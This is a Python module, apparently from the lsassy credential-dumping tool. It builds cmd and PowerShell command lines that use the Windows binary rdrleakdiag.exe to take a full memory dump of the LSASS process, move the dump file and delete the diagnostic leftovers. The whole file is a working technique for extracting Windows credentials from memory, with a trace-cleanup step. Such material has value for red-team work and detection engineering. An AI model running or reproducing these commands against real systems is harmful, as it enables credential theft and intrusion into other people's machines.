from lsassy.dumpmethod import IDumpMethod


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.waiting_time = 5

    def prepare(self, options):
        self.waiting_time = options.get("rdrleakdiag_wait", self.waiting_time)
        return True

    def get_commands(self):
        cmd_command = """for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rdrleakdiag.exe -p %J -enable & for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rdrleakdiag.exe -p %J -o {} -fullmemdmp -snap & ping 127.0.0.1 -n {} & for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do MOVE {}minidump_%J.dmp {}{} & for /f "tokens=2 delims= " %J in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do del {}results_%J.hlk""".format(
            self.dump_path, self.waiting_time, self.dump_path, self.dump_path, self.dump_name, self.dump_path
        )
        pwsh_command = """rdrleakdiag.exe -p (Get-Process lsass).Id -enable;rdrleakdiag.exe -p (Get-Process lsass).Id -o {} -fullmemdmp -snap;Start-Sleep {};Move-Item {}minidump_$((Get-Process lsass).Id).dmp {}{};Remove-Item {}results_$((Get-Process lsass).Id).hlk""".format(
            self.dump_path, self.waiting_time, self.dump_path, self.dump_path, self.dump_name, self.dump_path
        )
        return {
            "cmd": cmd_command,
            "pwsh": pwsh_command
        }
